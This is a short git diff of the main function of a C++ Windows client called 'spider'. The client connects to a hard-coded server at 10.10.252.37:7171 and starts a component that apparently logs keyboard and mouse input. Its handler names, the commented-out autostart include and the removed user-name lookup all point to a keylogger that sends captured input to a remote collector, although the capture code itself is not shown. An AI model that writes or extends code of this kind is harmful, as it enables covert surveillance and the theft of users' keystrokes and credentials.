@@ -2,13 +2,14 @@
 //
 #include <iostream>
 #include <Windows.h>
-#include <lmcons.h>
 
-#include "client/WindowsInputHandler.hpp"
+//#include "client/WindowsInputHandler.hpp"
 //#include "WindowsLogHandler.hpp"
 //#include "AutoStart.hpp"
 
-spider::socket::ClientTcpSocket tutu("10.10.252.37", 7171);
+#include "client/ClientSpider.hpp"
+
+spider::socket::ClientTcpSocket sock("10.10.252.37", 7171);
 
 void MessageLoop()
 {
@@ -39,8 +40,9 @@ int main(int ac, char **av)
 	WSADATA WSAData;
 	WSAStartup(MAKEWORD(2, 0), &WSAData);
 
-	tutu.connect();
-	if (tutu.startedService())
+	sock.setClientID(RANDOM_ID);
+	sock.connect();
+	if (sock.startedService())
 	{
 		std::cout << "CONNECTED !" << std::endl;
 	}
@@ -49,15 +51,13 @@ int main(int ac, char **av)
 		std::cout << "NOT CONNECTED !" << std::endl;
 	}
 
-	spider::WindowsInputHandler *toto = new spider::WindowsInputHandler((LPVOID)av[0]);
-	toto->startLogging(true, true);
+	spider::ClientSpider sp((LPVOID)av[0]);
+	sp.run();
 
-	TCHAR userName[UNLEN + 1];
-	DWORD userNameLength = UNLEN + 1;
+	//spider::WindowsInputHandler *inputHandler = new spider::WindowsInputHandler((LPVOID)av[0]);
+	//inputHandler->startLogging(true, true);
 
-	GetUserName((TCHAR*)userName, &userNameLength);
-
-	MessageLoop();
+	//MessageLoop();
 
 	WSACleanup();
 	return 0;
